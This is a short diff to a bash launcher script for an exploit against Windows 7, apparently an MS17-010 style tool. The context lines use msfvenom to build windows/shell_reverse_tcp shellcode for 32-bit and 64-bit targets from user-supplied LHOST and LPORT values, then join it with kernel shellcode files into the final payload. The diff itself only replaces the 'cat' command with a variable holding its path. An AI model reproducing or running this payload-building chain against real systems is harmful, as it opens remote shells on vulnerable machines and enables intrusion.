@@ -40,6 +40,7 @@ declare -r VAR28="msfvenom"
 declare -r VAR29="msfvenom not installed"
 declare -r VAR30="Windows 7"
 declare -r VAR31="Launching Exploit"
+declare -r NOBAT=$(which cat)
 
 function banner(){
   echo ""
@@ -99,7 +100,7 @@ read -p " $(echo -e $BLUE$SHELL $END)" opc
     sleep 2
     msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
     sleep 1
-    cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
+    $NOBAT sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
     echo -e "$WHITE$VAR9$GREEN$VAR11$WHITE$VAR10 $BLUE$VAR31$END"
     echo ""
     sleep 1
@@ -123,7 +124,7 @@ read -p " $(echo -e $BLUE$SHELL $END)" opc
     sleep 2
     msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
     sleep 1
-    cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
+    $NOBAT sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
     echo -e "$WHITE$VAR9$GREEN$VAR11$WHITE$VAR10 $BLUE$VAR31$END"
     echo ""
     sleep 1
